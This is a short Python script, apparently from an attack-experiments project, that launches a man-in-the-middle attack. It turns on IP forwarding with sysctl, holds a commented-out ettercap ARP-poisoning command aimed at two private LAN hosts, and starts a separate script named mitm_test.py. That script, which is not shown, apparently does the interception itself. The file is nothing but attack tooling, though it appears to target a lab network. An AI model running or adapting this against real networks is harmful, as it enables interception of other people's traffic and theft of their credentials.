import subprocess
import shlex

class MitmAttack():
    def start_forwarding(self):
        args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
        subprocess.call(args, shell=False)

    def launch_ettercap(self):
        args = shlex.split("ettercap -o -q -T -M arp /192.168.1.10// /192.168.1.20//")
        subprocess.Popen(args)

    def launch_mitm(self):
        mitm = subprocess.Popen(["../../../attack-experiments/env/bin/python", 'mitm_test.py'])
        return mitm

    def main(self):
        self.start_forwarding()
        #self.launch_ettercap()
        mitm = self.launch_mitm()
        mitm.wait()


if __name__ == "__main__":
    mitm = MitmAttack()
    mitm.main()